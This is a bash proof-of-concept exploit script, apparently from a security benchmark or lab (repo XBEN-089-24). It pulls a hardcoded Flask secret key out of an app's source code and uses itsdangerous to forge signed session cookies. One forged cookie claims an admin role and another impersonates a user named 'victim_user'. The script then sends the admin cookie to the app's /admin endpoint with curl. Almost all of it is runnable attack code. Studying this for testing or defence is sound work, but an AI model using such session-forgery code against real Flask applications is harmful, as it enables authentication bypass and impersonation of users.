#!/bin/bash

# POC: Flask Secret Key Exposure and Session Forgery
# This script demonstrates how an exposed Flask secret key can be used to forge sessions

set -e

TARGET_APP="${TARGET_APP:-http://localhost:5000}"
REPO_PATH="${REPO_PATH:-/home/daytona/repo/XBEN-089-24}"

echo "[*] Flask Secret Key Exposure and Session Forgery POC"
echo "[*] Target: $TARGET_APP"
echo ""

# Step 1: Verify secret key exposure in source code
echo "[+] Step 1: Checking for exposed secret key in source code..."
if [ -f "$REPO_PATH/app/app.py" ]; then
    SECRET_KEY=$(grep -oP "app\.secret_key\s*=\s*['\"]?\K[^'\"]*" "$REPO_PATH/app/app.py" | head -1)
    if [ -n "$SECRET_KEY" ]; then
        echo "[+] Exposed secret key found: $SECRET_KEY"
    else
        echo "[-] Could not extract secret key from source"
        exit 1
    fi
else
    echo "[-] app.py not found at $REPO_PATH/app/app.py"
    exit 1
fi
echo ""

# Step 2: Create a forged session cookie using the exposed secret key
echo "[+] Step 2: Creating forged session cookie with admin role..."
FORGED_COOKIE=$(python3 << PYTHON_EOF
from itsdangerous import URLSafeTimedSerializer
import json

SECRET_KEY = "$SECRET_KEY"
# Flask uses 'cookie-session' as the default salt
s = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')

# Create a forged session with admin role
forged_session = {'role': 'admin'}
forged_cookie = s.dumps(forged_session)
print(forged_cookie)
PYTHON_EOF
)

echo "[+] Forged session cookie created: $FORGED_COOKIE"
echo ""

# Step 3: Verify the cookie can be decoded using the secret key
echo "[+] Step 3: Verifying forged cookie can be decoded with secret key..."
DECODED=$(python3 << PYTHON_EOF
from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = "$SECRET_KEY"
s = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')

try:
    cookie = "$FORGED_COOKIE"
    decoded = s.loads(cookie)
    print(decoded)
except Exception as e:
    print(f"ERROR: {e}")
PYTHON_EOF
)

echo "[+] Decoded cookie content: $DECODED"
echo ""

# Step 4: Attempt to use the forged cookie to access admin endpoints
echo "[+] Step 4: Testing forged cookie against admin endpoint..."
RESPONSE=$(curl -s -c /tmp/cookies.txt -H "Cookie: session=$FORGED_COOKIE" \
    "$TARGET_APP/admin" \
    -w "\n%{http_code}" 2>/dev/null || echo "Connection failed")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "500" ]; then
    echo "[+] Server responded to admin endpoint with forged cookie"
    echo "[+] Response preview: ${BODY:0:200}"
else
    echo "[*] Server returned HTTP $HTTP_CODE (may indicate additional session validation)"
fi
echo ""

# Step 5: Create a forged cookie for employee impersonation
echo "[+] Step 5: Creating forged session for user impersonation..."
EMPLOYEE_COOKIE=$(python3 << PYTHON_EOF
from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = "$SECRET_KEY"
s = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')

# Create a forged session impersonating a specific user
forged_session = {'role': 'employee', 'user': 'victim_user'}
forged_cookie = s.dumps(forged_session)
print(forged_cookie)
PYTHON_EOF
)

echo "[+] Forged employee session cookie: $EMPLOYEE_COOKIE"
echo ""

# Step 6: Demonstrate the severity
echo "[+] Step 6: Vulnerability Summary"
echo "    - Secret key is exposed in source: $SECRET_KEY"
echo "    - Attacker can create valid, signed session cookies"
echo "    - Forged cookies are cryptographically valid (signed by exposed key)"
echo "    - This bypasses Flask's session integrity protection"
echo "    - Any role/user can be impersonated if session is accepted"
echo ""

echo "[+] POC Complete - Secret key exposure and session forgery demonstrated"